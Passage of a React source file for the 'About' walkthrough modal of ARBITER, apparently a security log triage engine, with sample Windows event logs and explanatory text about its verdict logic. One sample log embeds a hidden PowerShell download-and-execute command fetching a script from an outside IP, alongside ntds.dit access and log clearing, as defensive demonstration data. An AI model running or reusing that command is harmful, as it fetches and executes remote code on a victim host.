'use client'
import React, { useState, useEffect, useRef, useCallback } from 'react'
import { AnimatePresence, motion } from 'framer-motion'

const TOTAL_CARDS = 6
const STORAGE_KEY = 'arbiter_about_progress'
const AWAITING_KEY = 'arbiter_about_awaiting_return'
const TW_TEXT = 'Security tools generate alerts. Someone still has to decide what they mean, why they matter, and what to do next.'

const LOGS = {
  log1: `EventCode=4663\nObjectName=C:\\Windows\\NTDS\\ntds.dit\nProcessName=C:\\Windows\\System32\\ntdsutil.exe\nSubjectUserName=CORP\\svc_backup\nWorkstationName=CORP-DC-01\nTimeCreated=2024-03-15T02:11:44.003Z\n\nEventCode=1102\nSubjectUserName=CORP\\administrator\nWorkstationName=CORP-DC-01\nTimeCreated=2024-03-15T03:44:12.881Z\n\nEventCode=4698\nTaskName=\\Microsoft\\Windows\\Update\\WindowsUpdateCheck\nTaskContent=powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')"\nSubjectUserName=CORP\\jdoe\nWorkstationName=CORP-SRV-02\nTimeCreated=2024-03-15T10:33:41.887Z`,
  log2: `EventCode=4624\nLogonType=3\nTargetUserName=CORP\\administrator\nIpAddress=185.220.101.47\nWorkstationName=CORP-WS-14\nTimeCreated=2024-03-15T14:55:32.441Z`,
  log3: `EventCode=4625\nLogonType=3\nTargetUserName=administrator\nFailureReason=%%2313\nIpAddress=185.220.101.47\nWorkstationName=PROD-SERVER-01\nCount=47\nTimeCreated=2024-03-15T16:22:07.441Z`,
}

function loadProgress() {
  try { return Math.max(0, parseInt(localStorage.getItem(STORAGE_KEY) ?? '0', 10) || 0) }
  catch { return 0 }
}
function saveProgress(card) {
  try { localStorage.setItem(STORAGE_KEY, String(card)) } catch {}
}

function useTypewriter(text, active, speed = 40) {
  const [displayed, setDisplayed] = useState(active ? '' : text)
  const idx = useRef(active ? 0 : text.length)
  useEffect(() => {
    if (!active) { setDisplayed(text); idx.current = text.length; return }
    idx.current = 0; setDisplayed('')
    const timer = setInterval(() => {
      idx.current++; setDisplayed(text.slice(0, idx.current))
      if (idx.current >= text.length) clearInterval(timer)
    }, speed)
    return () => clearInterval(timer)
  }, [text, active, speed])
  return displayed
}

function ScrollChevron({ visible }) {
  return (
    <div style={{ marginTop: '48px', opacity: visible ? 1 : 0, transform: visible ? 'translateY(0)' : 'translateY(7px)', transition: 'opacity 0.48s ease, transform 0.48s ease' }}>
      <motion.div animate={{ y: [0, 5, 0] }} transition={{ duration: 1.8, repeat: Infinity, ease: 'easeInOut', repeatType: 'loop' }}>
        <svg width="18" height="10" viewBox="0 0 18 10" fill="none">
          <path d="M1 1.5L9 8.5L17 1.5" stroke="#F59E0B" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </motion.div>
    </div>
  )
}

function LogExhibit({ content, visible, maxHeight = '148px' }) {
  return (
    <div style={{ position: 'relative', margin: '14px 0', opacity: visible ? 1 : 0, transform: visible ? 'translateY(0)' : 'translateY(7px)', transition: 'opacity 0.45s ease, transform 0.45s ease' }}>
      <div style={{ padding: '14px 18px', background: 'rgba(245,158,11,0.04)', borderLeft: '2px solid rgba(245,158,11,0.3)', fontFamily: 'var(--font-mono), monospace', fontSize: '10.5px', lineHeight: 1.85, color: 'var(--text-secondary)', whiteSpace: 'pre', maxHeight: maxHeight, overflow: 'hidden', pointerEvents: 'none', userSelect: 'none' }}>
        {content}
      </div>
      <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: '48px', background: 'linear-gradient(transparent, #0F1520)', pointerEvents: 'none' }} />
    </div>
  )
}

const CARD_VARIANTS = {
  enter:  (dir) => ({ opacity: 0, y: dir === 'forward' ?  18 : -18 }),
  center:           ({ opacity: 1, y: 0, transition: { duration: 0.32, ease: [0.4, 0, 0.2, 1] } }),
  exit:   (dir) => ({ opacity: 0, y: dir === 'forward' ? -14 :  14, transition: { duration: 0.24, ease: 'easeIn' } }),
}
const FINAL_VARIANTS = {
  enter:  () => ({ opacity: 0, y: 18 }),
  center:    ({ opacity: 1, y: 0, transition: { duration: 0.4, ease: [0.4, 0, 0.2, 1] } }),
  exit:   () => ({ opacity: 0, y: -14, transition: { duration: 0.24, ease: 'easeIn' } }),
}

const S = {
  overlay: { position: 'fixed', inset: 0, background: 'rgba(8,12,20,0.85)', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center' },
  modal: { position: 'relative', background: 'var(--bg-card)', border: '0.5px solid var(--border-bright)', borderRadius: '8px', width: '78vw', maxWidth: '1200px', height: '88vh', maxHeight: '88vh', display: 'flex', flexDirection: 'column', overflow: 'hidden', boxShadow: '0 24px 64px rgba(0,0,0,0.6)', userSelect: 'none' },
  progressTrack: { position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'rgba(245,158,11,0.15)', zIndex: 10, borderRadius: '8px 8px 0 0' },
  closeBtn: { position: 'absolute', top: '14px', right: '18px', zIndex: 10, background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', cursor: 'pointer', fontSize: '14px', padding: 0, lineHeight: 1, transition: 'color 0.15s' },
  cardArea: { flex: 1, position: 'relative', overflow: 'hidden', minHeight: 0 },
  cardAnchored: { position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', justifyContent: 'flex-start', padding: '0 56px 40px', paddingTop: '22vh' },
  // Card 5 (closing): less top padding — content fills more of the card
  cardAnchoredShallow: { position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', justifyContent: 'flex-start', padding: '0 56px 40px', paddingTop: '10vh' },
  cardTop: { position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', justifyContent: 'flex-start', padding: '0 56px 32px', paddingTop: '14vh', overflowY: 'auto' },
  cardTopDense: { position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', justifyContent: 'flex-start', padding: '32px 56px 24px', overflowY: 'auto' },
  cardNum: { position: 'absolute', top: '18px', left: '56px', fontFamily: 'var(--font-mono), monospace', fontSize: '8px', letterSpacing: '0.18em', color: 'rgba(255,255,255,0.2)' },
  bodyText: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '15px', lineHeight: 1.82, color: 'var(--text-primary)', fontWeight: 300, maxWidth: '680px', marginBottom: '18px' },
  bodyDim:  { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '14px', lineHeight: 1.82, color: 'rgba(255,255,255,0.42)', fontWeight: 300, letterSpacing: '0.02em', maxWidth: '680px', marginBottom: '18px', marginTop: '4px' },
  bodyNote: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '14px', lineHeight: 1.75, color: 'rgba(255,255,255,0.4)', fontStyle: 'italic', marginBottom: '14px' },
  c0Line:   { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '16px', lineHeight: 1.82, fontWeight: 300, color: 'var(--text-primary)', marginBottom: '20px', transition: 'opacity 0.48s ease, transform 0.48s ease' },
  c0Sig:    { marginTop: '40px', paddingTop: '24px', borderTop: '1px solid rgba(245,158,11,0.2)', transition: 'opacity 0.48s ease, transform 0.48s ease' },
  c0SigName:{ fontFamily: 'var(--font-mono), monospace', fontSize: '20px', letterSpacing: '0.28em', color: 'var(--amber)', fontWeight: 500, marginBottom: '4px' },
  c0SigSub: { fontFamily: 'var(--font-mono), monospace', fontSize: '8px', letterSpacing: '0.2em', color: 'rgba(245,158,11,0.45)' },
  fragmentEngine: { marginTop: '22px', padding: '16px 20px', background: 'rgba(245,158,11,0.04)', borderLeft: '2px solid rgba(245,158,11,0.3)', fontFamily: 'var(--font-mono), monospace', fontSize: '11px', lineHeight: 1.85 },
  fragRow:   { display: 'flex', gap: '12px' },
  fragLabel: { minWidth: '74px', fontSize: '10px' },
  fragIndent:{ marginLeft: '86px', fontSize: '10px', color: 'rgba(255,255,255,0.4)' },
  fragmentWarn:    { marginBottom: '22px', padding: '12px 16px', background: 'rgba(245,158,11,0.04)', borderLeft: '2px solid rgba(245,158,11,0.55)', fontFamily: 'var(--font-mono), monospace', fontSize: '11px', lineHeight: 1.75, color: 'rgba(245,158,11,0.82)', whiteSpace: 'pre' },
  fragmentNeutral: { marginBottom: '22px', padding: '12px 16px', borderLeft: '2px solid rgba(255,255,255,0.1)', fontFamily: 'var(--font-mono), monospace', fontSize: '11px', lineHeight: 1.75, color: 'rgba(255,255,255,0.5)', whiteSpace: 'pre' },
  ndLabel: { fontSize: '12px', letterSpacing: '0.08em', marginBottom: '4px', color: 'rgba(255,255,255,0.55)', whiteSpace: 'normal' },
  loadBtn: { display: 'block', fontFamily: 'var(--font-mono), monospace', fontSize: '10px', letterSpacing: '0.14em', background: 'var(--amber)', color: '#000', border: 'none', padding: '10px 36px', cursor: 'pointer', fontWeight: 500, marginTop: '14px', width: 'fit-content', transition: 'opacity 0.1s', borderRadius: '2px' },
  // Small return instruction below LOAD AND ANALYZE — visible but unobtrusive
  returnHint: { fontFamily: 'var(--font-mono), monospace', fontSize: '8.5px', letterSpacing: '0.07em', color: 'rgba(255,255,255,0.22)', marginTop: '10px', lineHeight: 1.5 },
  finalWrap: { position: 'absolute', inset: 0, overflowY: 'auto', padding: '36px 56px 72px' },
  finalIntro: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '15px', lineHeight: 1.82, color: 'var(--text-primary)', fontWeight: 300, marginBottom: '42px', paddingBottom: '34px', borderBottom: '0.5px solid var(--border)' },
  finalBackBtn: { fontFamily: 'var(--font-mono), monospace', fontSize: '9px', letterSpacing: '0.1em', color: 'rgba(255,255,255,0.4)', background: 'none', border: 'none', cursor: 'pointer', padding: 0, marginBottom: '40px', display: 'block', transition: 'color 0.15s' },
  finalSecLabel: { fontFamily: 'var(--font-mono), monospace', fontSize: '8px', letterSpacing: '0.22em', color: 'var(--amber)', textTransform: 'uppercase', marginBottom: '14px' },
  finalBody: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '13.5px', lineHeight: 1.78, color: 'var(--text-secondary)', fontWeight: 300 },
  verdictTable: { marginTop: '18px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '10px 20px' },
  verdictTag:  { fontFamily: 'var(--font-mono), monospace', fontSize: '9px', letterSpacing: '0.07em', padding: '3px 9px', border: '0.5px solid rgba(245,158,11,0.3)', color: 'var(--amber)', whiteSpace: 'nowrap', alignSelf: 'start' },
  verdictDesc: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '13px', lineHeight: 1.6, color: 'var(--text-secondary)' },
  qaQ: { fontFamily: 'var(--font-mono), monospace', fontSize: '10.5px', color: 'var(--text-secondary)', marginBottom: '7px' },
  qaA: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '13.5px', lineHeight: 1.75, color: 'rgba(255,255,255,0.48)', fontWeight: 300 },
  builtByName: { fontFamily: 'var(--font-mono), monospace', fontSize: '14px', letterSpacing: '0.08em', color: 'var(--text-primary)', marginBottom: '3px' },
  builtByRole: { fontFamily: 'var(--font-mono), monospace', fontSize: '9px', letterSpacing: '0.1em', color: 'var(--text-muted)', marginBottom: '16px' },
  builtByText: { fontFamily: 'system-ui, -apple-system, sans-serif', fontSize: '13px', lineHeight: 1.72, color: 'rgba(255,255,255,0.42)', fontWeight: 300, maxWidth: '560px' },
  linkAmber: { display: 'inline-block', fontFamily: 'var(--font-mono), monospace', fontSize: '9px', letterSpacing: '0.1em', color: 'var(--amber)', border: '0.5px solid rgba(245,158,11,0.4)', padding: '7px 16px', textDecoration: 'none', borderRadius: '3px', transition: 'background 0.15s' },
  linkGhost: { display: 'inline-block', fontFamily: 'var(--font-mono), monospace', fontSize: '9px', letterSpacing: '0.1em', color: 'rgba(255,255,255,0.45)', border: '0.5px solid rgba(255,255,255,0.14)', padding: '7px 16px', textDecoration: 'none', borderRadius: '3px', transition: 'background 0.15s' },
}

export default function AboutModal({ onClose }) {
  const [card,      setCard]      = useState(() => loadProgress())
  const [slideDir,  setSlideDir]  = useState('forward')
  const [leaving,   setLeaving]   = useState(false)
  const [c0Phase,   setC0Phase]   = useState(0)
  const [cardPhase, setCardPhase] = useState(0)

  const isFinal = card === TOTAL_CARDS
  const tw      = useTypewriter(TW_TEXT, card === 0)
  const twDone  = tw.length === TW_TEXT.length

  const modalRef           = useRef(null)
  const isFinalRef         = useRef(false)
  const isTransRef         = useRef(false)
  const cardRef            = useRef(card)
  const navigateRef        = useRef(null)
  const wheelAccum         = useRef(0)
  const wheelTimerRef      = useRef(null)
  const touchY0            = useRef(0)
  const c0TimersRef        = useRef([])
  const cardPhaseTimersRef = useRef([])

  useEffect(() => { isFinalRef.current = isFinal }, [isFinal])
  useEffect(() => { cardRef.current    = card   },  [card])

  useEffect(() => {
    if (card !== 0) return
    c0TimersRef.current.forEach(clearTimeout)
    setC0Phase(0)
  }, [card])

  useEffect(() => {
    if (card !== 0 || !twDone) return
    c0TimersRef.current.forEach(clearTimeout)
    c0TimersRef.current = [
      setTimeout(() => setC0Phase(1),  350),
      setTimeout(() => setC0Phase(2),  800),
      setTimeout(() => setC0Phase(3), 1400),
      setTimeout(() => setC0Phase(4), 2100),
    ]
    return () => c0TimersRef.current.forEach(clearTimeout)
  }, [twDone, card])

  useEffect(() => {
    if (card === 0) return
    cardPhaseTimersRef.current.forEach(clearTimeout)
    setCardPhase(0)
    const PACING = {
      1: [0, 280, 560, 840, 1120],
      2: [0, 280, 560, 840],
      3: [0, 320, 660, 1000, 1340, 1680, 2020],
      4: [0, 320, 660, 1000, 1340, 1680, 2020],
      5: [0, 360, 760, 1160, 1560, 1960],
    }
    const delays = PACING[card] || [0, 300, 600, 900, 1200]
    cardPhaseTimersRef.current = delays.map((delay, i) =>
      setTimeout(() => setCardPhase(i + 1), delay)
    )
    return () => cardPhaseTimersRef.current.forEach(clearTimeout)
  }, [card])

  function ri(n) {
    return { opacity: c0Phase >= n ? 1 : 0, transform: c0Phase >= n ? 'translateY(0)' : 'translateY(7px)' }
  }
  function rp(n) {
    return { opacity: cardPhase >= n ? 1 : 0, transform: cardPhase >= n ? 'translateY(0)' : 'translateY(7px)', transition: 'opacity 0.45s ease, transform 0.45s ease' }
  }

  const navigate = useCallback((delta) => {
    if (isTransRef.current) return
    const next = cardRef.current + delta
    if (next < 0 || next > TOTAL_CARDS) return
    isTransRef.current = true
    setSlideDir(delta > 0 ? 'forward' : 'back')
    setCard(next)
    saveProgress(next)
    setTimeout(() => { isTransRef.current = false }, 600)
  }, [])

  useEffect(() => { navigateRef.current = navigate }, [navigate])

  useEffect(() => {
    const el = modalRef.current
    if (!el) return
    const handler = (e) => {
      if (isFinalRef.current) return
      e.preventDefault()
      wheelAccum.current += e.deltaY
      clearTimeout(wheelTimerRef.current)
      wheelTimerRef.current = setTimeout(() => {
        if (Math.abs(wheelAccum.current) > 30) navigateRef.current(wheelAccum.current > 0 ? 1 : -1)
        wheelAccum.current = 0
      }, 55)
    }
    el.addEventListener('wheel', handler, { passive: false })
    return () => el.removeEventListener('wheel', handler)
  }, [])

  useEffect(() => {
    const handler = (e) => {
      if (isFinalRef.current) return
      if (e.key === 'ArrowDown' || e.key === ' ') { e.preventDefault(); navigateRef.current(1) }
      if (e.key === 'ArrowUp')  { e.preventDefault(); navigateRef.current(-1) }
      if (e.key === 'Escape')   { handleClose() }
    }
    window.addEventListener('keydown', handler)
    return () => window.removeEventListener('keydown', handler)
  }, []) // eslint-disable-line

  useEffect(() => {
    const el = modalRef.current
    if (!el) return
    const onStart = (e) => { touchY0.current = e.touches[0].clientY }
    const onEnd   = (e) => {
      if (isFinalRef.current) return
      const dy = touchY0.current - e.changedTouches[0].clientY
      if (Math.abs(dy) > 45) navigateRef.current(dy > 0 ? 1 : -1)
    }
    el.addEventListener('touchstart', onStart, { passive: true })
    el.addEventListener('touchend',   onEnd,   { passive: true })
    return () => { el.removeEventListener('touchstart', onStart); el.removeEventListener('touchend', onEnd) }
  }, [])

  function loadLog(logKey, nextCard) {
    const log = LOGS[logKey]
    if (!log) return
    window.dispatchEvent(new CustomEvent('arbiter:load-log', { detail: { log } }))
    try {
      localStorage.setItem(AWAITING_KEY, '1')
      // 'storage' event only fires cross-tab. Dispatch a custom event so Header
      // picks up the flag in the same tab immediately.
      window.dispatchEvent(new CustomEvent('arbiter:about-awaiting'))
    } catch {}
    saveProgress(nextCard)
    handleClose()
  }

  function handleClose() { setLeaving(true); setTimeout(onClose, 160) }
  function reviewWalkthrough() { saveProgress(0); setSlideDir('back'); setCard(0) }

  // When the user reaches the final page:
  // 1. Clear the awaiting-return flag (button no longer needs to call them back)
  // 2. Mark the walkthrough as completed (button transitions to State C — normal)
  useEffect(() => {
    if (!isFinal) return
    try {
      localStorage.removeItem(AWAITING_KEY)
      localStorage.setItem('arbiter_about_completed', '1')
      // arbiter:about-completed handles both: clears awaiting AND sets completed in Header
      window.dispatchEvent(new CustomEvent('arbiter:about-completed'))
    } catch {}
  }, [isFinal])

  const progressPct = isFinal ? 100 : ((card + 1) / TOTAL_CARDS) * 100

  return (
    <>
      <style>{`
        @keyframes arbBlink{0%,100%{opacity:1}50%{opacity:0}}
        /* Hide native scrollbar on dense cards — wheel navigation captures scroll anyway */
        .arb-card-scroll { scrollbar-width: none; -ms-overflow-style: none; }
        .arb-card-scroll::-webkit-scrollbar { display: none; }
      `}</style>
      <motion.div style={S.overlay} initial={{ opacity: 0 }} animate={{ opacity: leaving ? 0 : 1 }} transition={{ duration: 0.18 }} onClick={handleClose}>
        <div ref={modalRef} style={S.modal} onClick={e => e.stopPropagation()}>

          <div style={S.progressTrack}>
            <motion.div style={{ height: '100%', background: 'var(--amber)', borderRadius: '8px 8px 0 0' }} animate={{ width: progressPct + '%' }} transition={{ duration: 0.35, ease: [0.4,0,0.2,1] }} />
          </div>

          <button style={S.closeBtn} onClick={handleClose}
            onMouseEnter={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.75)')}
            onMouseLeave={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.3)')}
          >✕</button>

          <div style={S.cardArea}>
            <AnimatePresence mode="wait" custom={slideDir}>

              {!isFinal && (
                <motion.div key={card} custom={slideDir} variants={CARD_VARIANTS} initial="enter" animate="center" exit="exit"
                  className={[2,3,4].includes(card) ? 'arb-card-scroll' : undefined}
                  style={card === 4 ? S.cardTopDense : [2,3].includes(card) ? S.cardTop : card === 5 ? S.cardAnchoredShallow : S.cardAnchored}
                >
                  {/* ── CARD 0 ── */}
                  {card === 0 && (<>
                    <p style={S.c0Line}>
                      {tw}
                      {!twDone && <span style={{ display:'inline-block', width:'1px', height:'1em', background:'var(--amber)', verticalAlign:'text-bottom', animation:'arbBlink 0.75s step-end infinite' }} />}
                    </p>
                    <p style={{ ...S.c0Line, ...ri(1) }}>ARBITER helps you handle that with every step of the reasoning written out, traceable and auditable.</p>
                    <p style={{ ...S.bodyDim, marginBottom:'20px', ...ri(2) }}>Built to be tested, used and, above all, relied on for what it can point to.</p>
                    <div style={{ ...S.c0Sig, ...ri(3) }}>
                      <div style={S.c0SigName}>ARBITER</div>
                      <div style={S.c0SigSub}>DETECTION TRIAGE ENGINE</div>
                    </div>
                    <ScrollChevron visible={c0Phase >= 4} />
                  </>)}

                  {/* ── CARD 1 ── */}
                  {card === 1 && (<>
                    <div style={S.cardNum}>02 / 06</div>
                    <p style={{ ...S.bodyText, ...rp(1) }}>When the engine produces a verdict, it shows you the exact signal that drove it, which rule fired, what weight it carried, where the evidence came from. Not a probability. A named rule with a named source.</p>
                    <p style={{ ...S.bodyText, marginBottom:0, ...rp(2) }}>This is the dominant signal from a real alert. Everything else in the verdict flows from here.</p>
                    <div style={{ ...S.fragmentEngine, ...rp(3) }}>
                      <div style={{ ...S.fragRow, color:'var(--amber)' }}>
                        <span style={{ ...S.fragLabel, color:'rgba(245,158,11,0.7)' }}>dominant</span>
                        <span>ntds.dit accessed [NTDS_ACCESS]</span>
                      </div>
                      <div style={S.fragIndent}>weight=5 · confidence=99 · source=syslog</div>
                      <div style={{ ...S.fragRow, opacity:0.42, color:'var(--text-secondary)', marginTop:'7px' }}>
                        <span style={S.fragLabel}>severity</span>
                        <span>CRITICAL across 7 signals</span>
                      </div>
                    </div>
                    <p style={{ ...S.bodyDim, marginTop:'22px', marginBottom:'16px', ...rp(4) }}>The alert that produced this signal is below.</p>
                    <ScrollChevron visible={cardPhase >= 5} />
                  </>)}

                  {/* ── CARD 2 ── */}
                  {card === 2 && (<>
                    <div style={S.cardNum}>03 / 06</div>
                    <p style={{ ...S.bodyText, ...rp(1) }}>A domain controller. A backup service account. An encoded PowerShell payload phoning home. Three events, same session.</p>
                    <p style={{ ...S.bodyNote, ...rp(2) }}>Run it.</p>
                    <LogExhibit content={LOGS.log1} visible={cardPhase >= 3} />
                    <div style={rp(4)}>
                      <button style={S.loadBtn} onClick={() => loadLog('log1', 3)}
                        onMouseEnter={e => (e.currentTarget.style.opacity='0.85')}
                        onMouseLeave={e => (e.currentTarget.style.opacity='1')}
                      >LOAD AND ANALYZE →</button>
                      <p style={S.returnHint}>Run it, then return here via the ABOUT button. The next card explains what the engine found.</p>
                    </div>
                  </>)}

                  {/* ── CARD 3 ── */}
                  {card === 3 && (<>
                    <div style={S.cardNum}>04 / 06</div>
                    <div style={{ ...S.fragmentWarn, marginBottom: '10px', ...rp(1) }}>{`⚠ CHAIN     Signals span 4 attack tactics — verify full\n               attack chain before acting`}</div>
                    <p style={{ ...S.bodyText, marginBottom: '10px', ...rp(2) }}>100% confidence. TRACE_REQUIRED.</p>
                    <p style={{ ...S.bodyText, marginBottom: '10px', ...rp(3) }}>When signals span multiple attack tactics simultaneously, the engine flags the complexity explicitly. High confidence in the detection, uncertainty about the full picture. The distinction matters.</p>
                    <p style={{ ...S.bodyText, marginBottom: '10px', ...rp(4) }}>A confirmed malicious IP. AbuseIPDB 95/100. Tor exit node. Successful logon.</p>
                    <p style={{ ...S.bodyNote, marginBottom: '10px', ...rp(5) }}>What should the engine do?</p>
                    <LogExhibit content={LOGS.log2} visible={cardPhase >= 6} maxHeight="110px" />
                    <div style={rp(7)}>
                      <button style={S.loadBtn} onClick={() => loadLog('log2', 4)}
                        onMouseEnter={e => (e.currentTarget.style.opacity='0.85')}
                        onMouseLeave={e => (e.currentTarget.style.opacity='1')}
                      >LOAD AND ANALYZE →</button>
                      <p style={S.returnHint}>Run it, then return here — the next card explains what the engine decided and why.</p>
                    </div>
                  </>)}

                  {/* ── CARD 4 ── */}
                  {card === 4 && (<>
                    <div style={S.cardNum}>05 / 06</div>
                    <div style={{ ...S.fragmentNeutral, marginBottom: '10px', ...rp(1) }}>
                      <div style={S.ndLabel}>NO DETECTION</div>
                      {`Threat intelligence identified a confirmed malicious IP,\nbut ARBITER requires behavioral evidence to issue a\nverdict — IP reputation alone is not sufficient.`}
                    </div>
                    <p style={{ ...S.bodyText, marginBottom: '10px', ...rp(2) }}>The IP was malicious. The enrichment confirmed it. The engine still did not issue a verdict.</p>
                    <p style={{ ...S.bodyText, marginBottom: '10px', ...rp(3) }}>IP reputation tells you something about the source. It does not tell you what happened. ARBITER requires a specific action, a specific behavioral pattern, before committing to a verdict. A system that issues verdicts on enrichment alone will eventually be wrong in ways that matter.</p>
                    <p style={{ ...S.bodyText, marginBottom: '10px', ...rp(4) }}>Same IP. Different log. Different host.</p>
                    <p style={{ ...S.bodyNote, marginBottom: '10px', ...rp(5) }}>Run it again.</p>
                    <LogExhibit content={LOGS.log3} visible={cardPhase >= 6} maxHeight="110px" />
                    <div style={rp(7)}>
                      <button style={S.loadBtn} onClick={() => loadLog('log3', 5)}
                        onMouseEnter={e => (e.currentTarget.style.opacity='0.85')}
                        onMouseLeave={e => (e.currentTarget.style.opacity='1')}
                      >LOAD AND ANALYZE →</button>
                      <p style={{ ...S.returnHint, marginTop: '16px' }}>Run it, then return here. The final card closes the arc.</p>
                    </div>
                  </>)}

                  {/* ── CARD 5 ── */}
                  {card === 5 && (<>
                    <div style={S.cardNum}>06 / 06</div>
                    <p style={{ ...S.bodyText, ...rp(1) }}>Every decision traceable. Every signal sourced. Every limitation written out explicitly.</p>
                    <p style={{ ...S.bodyText, ...rp(2) }}>The MITRE panel maps every technique the engine has seen this session. The Containment Playbook is the button below the analysis panel. It opens a structured three-phase investigation when you decide to move from triage to response.</p>
                    <p style={{ ...S.bodyText, ...rp(3) }}>The Audit Log keeps a full JSON record of every alert you run: verdict, signals, enrichment, confidence breakdown. It is exportable and built for accountability.</p>
                    <p style={{ ...S.bodyText, ...rp(4) }}>ARBITER normalizes logs across four formats: Windows Event, Linux Syslog, CloudTrail and a generic fallback. Paste any alert and watch the engine work.</p>
                    <p style={{ ...S.bodyNote, marginTop: '4px', ...rp(5) }}>The architecture behind all of it is documented in full on GitHub.</p>
                    <div style={{ marginTop:'40px', ...rp(6) }}>
                      <motion.div
                        style={{ display:'inline-flex', alignItems:'center', gap:'10px', cursor:'pointer', border:'0.5px solid rgba(245,158,11,0.5)', padding:'10px 20px', borderRadius:'3px' }}
                        whileHover={{ borderColor:'rgba(245,158,11,0.9)', background:'rgba(245,158,11,0.07)' }}
                        onClick={() => navigate(1)}
                      >
                        <span style={{ fontFamily:'var(--font-mono), monospace', fontSize:'10px', letterSpacing:'0.12em', color:'var(--amber)' }}>KNOW MORE ABOUT ARBITER</span>
                        <motion.span style={{ color:'var(--amber)', fontSize:'12px' }} animate={{ x:[0,4,0] }} transition={{ duration:1.6, repeat:Infinity, ease:'easeInOut' }}>→</motion.span>
                      </motion.div>
                    </div>
                  </>)}

                </motion.div>
              )}

              {/* ── FINAL PAGE ── */}
              {isFinal && (
                <motion.div key="final" variants={FINAL_VARIANTS} initial="enter" animate="center" exit="exit" style={S.finalWrap}>
                  <button style={S.finalBackBtn} onClick={reviewWalkthrough}
                    onMouseEnter={e => (e.currentTarget.style.color='rgba(255,255,255,0.65)')}
                    onMouseLeave={e => (e.currentTarget.style.color='rgba(255,255,255,0.4)')}
                  >← Review the walkthrough</button>

                  <div style={S.finalIntro}>ARBITER is a deterministic log triage engine. It processes security events through a layered signal architecture, produces structured verdicts with full trace evidence, and acknowledges its own uncertainty when the evidence demands it. Every step of its reasoning is visible and auditable.</div>

                  <div style={{ marginBottom:'34px', paddingBottom:'34px', borderBottom:'0.5px solid var(--border)' }}>
                    <div style={S.finalSecLabel}>WHAT ARBITER IS</div>
                    <div style={S.finalBody}>
                      <p style={{ marginBottom:'13px' }}>ARBITER accepts raw log input in multiple formats — Windows Event, Syslog, CloudTrail, EDR, Linux, and a generic fallback — and processes each event through a four-layer signal evaluation stack. The output is one of five verdict states, each accompanied by the full signal trace, a behavioral synthesis from the narrator layer, MITRE ATT&CK mappings, and threat intelligence enrichment from AbuseIPDB and VirusTotal.</p>
                      <p>It does not generate alerts. It triages them. The distinction is the entire point.</p>
                    </div>
                  </div>

                  <div style={{ marginBottom:'34px', paddingBottom:'34px', borderBottom:'0.5px solid var(--border)' }}>
                    <div style={S.finalSecLabel}>HOW THE ENGINE DECIDES</div>
                    <div style={S.finalBody}>
                      <p style={{ marginBottom:'13px' }}>Signals are organized in four layers: behavioral, enrichment, temporal (Redis-based correlation), and asset. Each signal carries a weight, a confidence contribution, and a source. The Abstract Contextual Signal framework (ACS v2) governs how signals combine into verdicts.</p>
                      <p style={{ marginBottom:'13px' }}>Before a verdict is issued, signals pass through a provenance independence gate — a test that verifies the evidence base is not semantically circular. This prevents false confidence inflation.</p>
                      <p>Confidence decomposition happens through Model E, which separates base confidence, consistency bonus, and contradiction penalty. TRACE_REQUIRED is not a failure state. It is the engine&apos;s explicit acknowledgment that the evidence requires human judgment before action.</p>
                    </div>
                    <div style={S.verdictTable}>
                      {[
                        ['SURFACE_SAFE','Behavioral signals present but below verdict threshold. The activity was evaluated, not ignored.'],
                        ['TRACE_REQUIRED','High confidence with signal contradiction across tactics. Read the full trace before acting.'],
                        ['NO_DETECTION','No behavioral signals met the independence gate requirements. Enrichment alone is not sufficient.'],
                        ['BENIGN_NOISE','Pattern matched but below meaningful threshold. Logged, not escalated.'],
                        ['CRITICAL / HIGH / MEDIUM / LOW','Severity-graded alert with full trace, dominant signal, MITRE mappings, and enrichment data.'],
                      ].map(([tag, desc]) => (
                        <React.Fragment key={tag}>
                          <span style={S.verdictTag}>{tag}</span>
                          <span style={S.verdictDesc}>{desc}</span>
                        </React.Fragment>
                      ))}
                    </div>
                  </div>

                  <div style={{ marginBottom:'34px', paddingBottom:'34px', borderBottom:'0.5px solid var(--border)' }}>
                    <div style={S.finalSecLabel}>WHY DETERMINISTIC AND NOT ML</div>
                    {[
                      ['Why not use a machine learning model?','ML models produce outputs they cannot explain. In SOC environments, "the model decided" is not an acceptable audit trail. When a wrong decision carries operational consequences, you need to know which rule fired, what evidence it saw, and why the weight was assigned. ARBITER produces that trace for every verdict.'],
                      ['What about adaptability?','Deterministic systems are extended through new signals, not retrained. Adding a signal means writing a rule with an explicit weight and a defined evidence requirement. The logic is visible before deployment. A model update is a black box even to its authors.'],
                      ['Is this relevant to regulated sectors?','EU AI Act, GDPR Article 22, and DORA all create auditability requirements around automated decisions. A system that produces a complete decision trace on demand is architecturally aligned with those requirements. A probabilistic model is not.'],
                    ].map(([q,a]) => (
                      <div key={q} style={{ marginBottom:'20px' }}>
                        <div style={S.qaQ}>{q}</div>
                        <div style={S.qaA}>{a}</div>
                      </div>
                    ))}
                  </div>

                  <div style={{ marginBottom:'34px', paddingBottom:'34px', borderBottom:'0.5px solid var(--border)' }}>
                    <div style={S.finalSecLabel}>THE ARCHITECTURE</div>
                    <div style={S.finalBody}>
                      <p style={{ marginBottom:'13px' }}>The ACS v2 provenance model tracks the origin of every signal contribution. The provenance independence gate compares signal sources against semantic independence criteria before allowing joint confidence contribution.</p>
